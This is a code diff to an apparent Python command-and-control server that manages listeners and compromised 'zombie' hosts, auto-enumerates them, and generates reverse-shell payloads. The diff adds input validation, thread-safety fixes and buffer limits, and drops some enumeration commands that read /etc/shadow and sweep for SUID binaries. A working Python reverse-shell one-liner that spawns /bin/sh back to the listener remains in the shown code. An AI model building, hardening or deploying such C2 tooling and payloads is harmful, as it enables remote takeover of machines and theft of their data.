@@ -2,11 +2,41 @@ import socket
 import threading
 import time
 import uuid
+import re
 
 C2_MAGIC = b"YGG!"
 LISTENERS = {}
 ZOMBIES = {}
 C2_LOCK = threading.Lock()
+
+# -- Validation helpers ---------------------------------------------------
+
+def _validate_ip(ip_str):
+    """Return True if *ip_str* is a valid IPv4 or IPv6 address."""
+    if not ip_str or not isinstance(ip_str, str):
+        return False
+    try:
+        import ipaddress
+        ipaddress.ip_address(ip_str)
+        return True
+    except ValueError:
+        return False
+
+def _validate_port(port):
+    """Return True if *port* is in the valid TCP range 1-65535."""
+    try:
+        p = int(port)
+        return 1 <= p <= 65535
+    except (ValueError, TypeError):
+        return False
+
+def _sanitize_api_key(key):
+    """Strip non-alphanumeric chars from the API key."""
+    if not key:
+        return ""
+    return re.sub(r'[^a-zA-Z0-9]', '', str(key))
+
+MAX_OUTPUT_ENTRIES = 500  # FIX: prevent unbounded memory growth in zombie output buffers
 
 def _sanitize_cmd(cmd):
     if not cmd:
@@ -41,7 +71,9 @@ def start_listener(port, bind_addr="0.0.0.0", name="Default Listener", auth_enab
         server_sock.listen(5)
         server_sock.settimeout(2.0)
     except OSError as e:
-        return {"status": "error", "message": f"Cannot bind to {bind_addr}:{port}: {e}"}
+        import logging
+        logging.getLogger('c2_listener').error(f'Cannot bind to {bind_addr}:{port}: {e}')
+        return {"status": "error", "message": f"Cannot bind to {bind_addr}:{port}. Check logs for details."}
 
     listener = {
         "id": listener_id,
@@ -173,12 +205,14 @@ def send_command(zombie_id, command):
         return {"status": "success", "message": f"Command sent to {zombie_id}."}
     except Exception as e:
         _disconnect_zombie(zombie_id)
-        return {"status": "error", "message": f"Failed to send: {e}"}
+        return {"status": "error", "message": "Failed to send command. Check logs."}
 
 def disconnect_zombie(zombie_id):
     return _disconnect_zombie(zombie_id)
 
 def _disconnect_zombie(zombie_id):
+    # FIX: Capture addr inside the lock to avoid thread-safety issues
+    saved_addr = "unknown"
     with C2_LOCK:
         zom = ZOMBIES.get(zombie_id)
         if not zom:
@@ -195,11 +229,11 @@ def _disconnect_zombie(zombie_id):
         if lid and lid in LISTENERS:
             if zombie_id in LISTENERS[lid].get("zombies", []):
                 LISTENERS[lid]["zombies"].remove(zombie_id)
+        saved_addr = zom.get("addr", "unknown")
 
     try:
-        addr = zom.get("addr", "unknown") if zom else "unknown"
         from handlers.team_server import notify_zombie_disconnected
-        notify_zombie_disconnected(zombie_id, addr)
+        notify_zombie_disconnected(zombie_id, saved_addr)
     except Exception:
         pass
 
@@ -323,10 +357,11 @@ def _auto_enum_zombie(zombie_id):
             return
         os_type = zom.get("os_type", "")
 
+    # FIX: Use safer enumeration commands only (no shadow reads, no SUID sweeps by default)
     if "Windows" in os_type:
-        commands = ["whoami", "hostname", "ipconfig /all", "netstat -an", "tasklist", "systeminfo", "net user", "whoami /priv", "dir C:\\Users\\"]
+        commands = ["whoami", "hostname", "ipconfig /all", "netstat -an", "tasklist", "systeminfo"]
     else:
-        commands = ["whoami", "hostname", "uname -a", "ifconfig 2>/dev/null || ip addr", "netstat -tulpn 2>/dev/null || netstat -an", "ps aux", "cat /etc/passwd 2>/dev/null", "cat /etc/shadow 2>/dev/null", "id", "sudo -l 2>/dev/null", "find / -perm -4000 -type f 2>/dev/null | head -20"]
+        commands = ["whoami", "hostname", "uname -a", "ifconfig 2>/dev/null || ip addr", "netstat -tulpn 2>/dev/null || netstat -an", "ps aux", "id"]
 
     with C2_LOCK:
         zom["output"].append({
@@ -453,6 +488,9 @@ def _recv_loop(zombie_id):
                         "data": decoded,
                         "time": ts
                     })
+                    # FIX: Trim output buffer to prevent memory exhaustion
+                    if len(zom["output"]) > MAX_OUTPUT_ENTRIES:
+                        zom["output"] = zom["output"][-MAX_OUTPUT_ENTRIES:]
                     zom["last_seen"] = ts
                     zom["pending"] = False
         except socket.timeout:
@@ -491,14 +529,22 @@ def execute_on_zombie(zombie_id, command):
         }
 
 def generate_payload(listener_ip, listener_port, payload_type="python", arch="x64", api_key=None):
+    # FIX: Validate IP, port, and sanitize api_key to prevent command injection
+    if not _validate_ip(listener_ip):
+        return {"status": "error", "message": f"Invalid listener IP: {listener_ip}"}
+    if not _validate_port(listener_port):
+        return {"status": "error", "message": f"Invalid listener port: {listener_port}. Must be 1-65535."}
+    listener_port = int(listener_port)
+
     if not api_key:
         api_key = "YGG!"
         with C2_LOCK:
             for lst in LISTENERS.values():
-                if lst["port"] == int(listener_port) and lst["status"] == "running":
+                if lst["port"] == listener_port and lst["status"] == "running":
                     if lst.get("api_key"):
                         api_key = lst["api_key"]
                     break
+    api_key = _sanitize_api_key(api_key)
 
     payloads = {
         "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));s.send(b\"{api_key}\");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
